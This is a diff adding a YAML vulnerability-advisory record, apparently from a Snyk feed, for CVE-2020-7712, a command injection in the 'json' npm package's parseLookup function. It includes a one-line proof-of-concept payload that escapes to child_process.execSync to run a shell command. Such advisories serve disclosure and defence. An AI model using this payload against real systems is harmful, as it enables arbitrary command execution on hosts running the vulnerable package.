@@ -1,0 +1,27 @@
+---
+- id: snykio:maven:org.webjars.npm:json:608931
+  title: Command Injection
+  description: "[org.webjars.npm:json][1] is an a \\'json\\' command for massaging
+    and\nprocessing JSON on the command line\n\nAffected versions of this package
+    are vulnerable to Command Injection.\nIt is possible to inject arbritary commands
+    using the `parseLookup`\nfunction.\n\n### PoC   {#poc}\n\n    const json = require('json');\n
+    \   \n    res = json.parseLookup('{[this.constructor.constructor(\"return process\")().mainModule.require(\"child_process\").execSync(\"id\").toString()]}');\n
+    \   console.log(res);\n\n\n\n[1]: https://www.npmjs.com/package/json\n"
+  affected_package: org.webjars.npm:json
+  vulnerable_versions:
+  - ">= 0"
+  severity: high
+  package_manager: maven
+  cve:
+  - CVE-2020-7712
+  cwe:
+  - CWE-78
+  disclosed_date: 2020-08-06
+  created_date: 2020-08-30
+  last_modified_date: 2020-08-30
+  credit:
+  - po6ix
+  references:
+  - https://github.com/trentm/json/issues/144
+  - https://github.com/trentm/json/pull/145
+  source_url: https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-608931
